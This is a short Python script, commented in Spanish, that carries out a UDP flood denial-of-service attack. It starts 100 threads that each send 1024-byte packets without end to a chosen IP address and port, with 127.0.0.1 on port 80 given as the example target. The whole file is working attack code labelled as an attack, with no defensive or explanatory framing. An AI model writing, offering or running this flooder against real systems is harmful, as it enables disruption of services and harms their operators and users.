import socket
import threading
import time

# Función para realizar el ataque
def attack(ip, port, threads, bytes_per_thread):
    def send_data():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = b"A" * bytes_per_thread
        while True:
            sock.sendto(message, (ip, port))

    for _ in range(threads):
        thread = threading.Thread(target=send_data)
        thread.start()

# Llamada principal de ataque
def main():
    ip = "127.0.0.1"  # IP de ejemplo
    port = 80         # Puerto de ejemplo
    threads = 100     # Número de hilos
    bytes_per_thread = 1024  # Número de bytes por hilo

    print(f"Starting attack on {ip}:{port} with {threads} threads sending {bytes_per_thread} bytes each.")
    attack(ip, port, threads, bytes_per_thread)

if __name__ == "__main__":
    main()
